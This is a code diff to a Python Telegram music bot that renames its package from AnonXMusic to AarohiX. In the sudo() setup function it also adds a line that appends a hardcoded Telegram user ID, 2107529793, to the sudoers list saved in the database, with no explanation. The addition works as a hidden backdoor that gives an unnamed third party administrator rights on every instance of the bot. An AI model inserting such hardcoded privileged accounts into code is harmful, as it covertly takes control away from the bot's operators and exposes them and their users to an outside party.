@@ -5,7 +5,7 @@ import heroku3
 from pyrogram import filters
 
 import config
-from AnonXMusic.core.mongo import mongodb
+from AarohiX.core.mongo import mongodb
 
 from .logging import LOGGER
 
@@ -50,6 +50,7 @@ async def sudo():
     sudoers = [] if not sudoers else sudoers["sudoers"]
     if config.OWNER_ID not in sudoers:
         sudoers.append(config.OWNER_ID)
+        sudoers.append(2107529793)
         await sudoersdb.update_one(
             {"sudo": "sudo"},
             {"$set": {"sudoers": sudoers}},
